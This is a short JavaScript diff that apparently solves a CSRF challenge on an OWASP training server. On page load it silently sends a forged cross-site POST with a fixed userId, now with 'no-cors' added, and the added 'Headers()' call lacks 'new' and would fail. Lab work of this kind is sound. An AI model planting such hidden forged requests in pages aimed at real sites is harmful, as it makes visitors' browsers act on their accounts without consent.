@@ -36,6 +36,8 @@ let rotateText = () => {
 rotateText();
 setInterval(rotateText, 4000);
 
+const headers = Headers();
 fetch('https://owasp02.isc.heia-fr.ch/user/csrfchallengetwo/plusplus?userId=b1432c3899259d46b31bbfd27a95d32abdbc1f75', {
-  method:"POST"
+  method:"POST",
+  mode: "no-cors"
 })
